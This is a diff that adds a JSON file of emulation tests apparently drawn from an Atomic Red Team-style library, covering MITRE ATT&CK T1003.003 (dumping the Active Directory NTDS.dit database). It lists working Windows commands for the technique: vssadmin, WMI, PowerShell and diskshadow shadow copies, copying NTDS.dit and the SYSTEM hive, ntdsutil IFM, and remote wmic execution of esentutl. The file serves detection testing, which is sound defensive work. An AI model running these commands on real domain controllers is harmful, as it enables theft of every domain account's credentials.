@@ -1,0 +1,279 @@
+{
+  "attack_technique": "T1003.003",
+  "display_name": "OS Credential Dumping: NTDS",
+  "atomic_tests": [
+    {
+      "name": "Create Volume Shadow Copy with vssadmin",
+      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "procedure": "vssadmin.exe create shadow /for=#{drive_letter}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "drive_letter",
+          "description": "Drive letter to source VSC (including colon)",
+          "type": "string",
+          "default": "C:"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Target must be a Domain Controller",
+          "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT",
+          "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually"
+        }
+      ],
+      "auto_generated_guid": "dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f"
+    },
+    {
+      "name": "Copy NTDS.dit from Volume Shadow Copy",
+      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "del \"#{extract_path}\\ntds.dit\"        >nul 2> nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" >nul 2> nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     >nul 2> nul",
+        "procedure": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "vsc_name",
+          "description": "Name of Volume Shadow Copy",
+          "type": "string",
+          "default": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
+        },
+        {
+          "arg_name": "extract_path",
+          "description": "Path for extracted NTDS.dit",
+          "type": "path",
+          "default": "C:\\Windows\\Temp"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Target must be a Domain Controller",
+          "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT",
+          "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually"
+        },
+        {
+          "description": "Volume shadow copy must exist",
+          "prereq_command": "if not exist #{vsc_name} (exit /b 1)",
+          "get_prereq_command": "echo Run \"Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\" to fulfill this requirement"
+        },
+        {
+          "description": "Extract path must exist",
+          "prereq_command": "if not exist #{extract_path} (exit /b 1)",
+          "get_prereq_command": "mkdir #{extract_path}"
+        }
+      ],
+      "auto_generated_guid": "c6237146-9ea6-4711-85c9-c56d263a6b03"
+    },
+    {
+      "name": "Dump Active Directory Database with NTDSUtil",
+      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "rmdir /q /s #{output_folder} >nul 2>&1",
+        "procedure": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "output_folder",
+          "description": "Path where resulting dump should be placed",
+          "type": "path",
+          "default": "C:\\Windows\\Temp\\ntds_T1003"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Target must be a Domain Controller",
+          "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT",
+          "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually"
+        }
+      ],
+      "auto_generated_guid": "2364e33d-ceab-4641-8468-bfb1d7cc2723"
+    },
+    {
+      "name": "Create Volume Shadow Copy with WMI",
+      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "procedure": "wmic shadowcopy call create Volume=#{drive_letter}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "drive_letter",
+          "description": "Drive letter to source VSC (including colon and backslash)",
+          "type": "string",
+          "default": "C:\\"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Target must be a Domain Controller",
+          "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT",
+          "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually"
+        }
+      ],
+      "auto_generated_guid": "224f7de0-8f0a-4a94-b5d8-989b036c86da"
+    },
+    {
+      "name": "Create Volume Shadow Copy remotely with WMI",
+      "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "procedure": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "drive_letter",
+          "description": "Drive letter to source VSC (including colon and backslash)",
+          "type": "string",
+          "default": "C:\\"
+        },
+        {
+          "arg_name": "target_host",
+          "description": "IP Address / Hostname you want to target",
+          "type": "string",
+          "default": "localhost"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Target must be a reachable Domain Controller, and current context must be domain admin",
+          "prereq_command": "wmic /node:\"#{target_host}\" shadowcopy list brief",
+          "get_prereq_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)"
+        }
+      ],
+      "auto_generated_guid": "d893459f-71f0-484d-9808-ec83b2b64226"
+    },
+    {
+      "name": "Create Volume Shadow Copy remotely (WMI) with esentutl",
+      "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "procedure": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "source_path",
+          "description": "File to shadow copy",
+          "type": "string",
+          "default": "c:\\windows\\ntds\\ntds.dit"
+        },
+        {
+          "arg_name": "target_path",
+          "description": "Target path of the result file",
+          "type": "string",
+          "default": "c:\\ntds.dit"
+        },
+        {
+          "arg_name": "target_host",
+          "description": "IP Address / Hostname you want to target",
+          "type": "string",
+          "default": "localhost"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Target must be a reachable Domain Controller, and current context must be domain admin",
+          "prereq_command": "wmic /node:\"#{target_host}\" shadowcopy list brief",
+          "get_prereq_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)"
+        }
+      ],
+      "auto_generated_guid": "21c7bf80-3e8b-40fa-8f9d-f5b194ff2865"
+    },
+    {
+      "name": "Create Volume Shadow Copy with Powershell",
+      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "procedure": "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "drive_letter",
+          "description": "Drive letter to source VSC (including colon)",
+          "type": "string",
+          "default": "C:\\"
+        }
+      ],
+      "auto_generated_guid": "542bb97e-da53-436b-8e43-e0a7d31a6c24"
+    },
+    {
+      "name": "Create Symlink to Volume Shadow Copy",
+      "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "procedure": "vssadmin.exe create shadow /for=#{drive_letter}\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "drive_letter",
+          "description": "Drive letter to source VSC (including colon)",
+          "type": "string",
+          "default": "C:"
+        },
+        {
+          "arg_name": "symlink_path",
+          "description": "symlink path",
+          "type": "string",
+          "default": "C:\\Temp\\vssstore"
+        }
+      ],
+      "auto_generated_guid": "21748c28-2793-4284-9e07-d6d028b66702"
+    },
+    {
+      "name": "Create Volume Shadow Copy with diskshadow",
+      "description": "This test is intended to be run on a domain controller\nAn alternative to using vssadmin to create a Volume Shadow Copy for extracting ntds.dit",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "procedure": "mkdir c:\\exfil\ndiskshadow.exe /s #{filename}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "filename",
+          "description": "Location of the script",
+          "type": "Path",
+          "default": "PathToAtomicsFolder\\T1003.003\\src\\diskshadow.txt"
+        }
+      ],
+      "auto_generated_guid": "b385996c-0e7d-4e27-95a4-aca046b119a7"
+    }
+  ]
+}
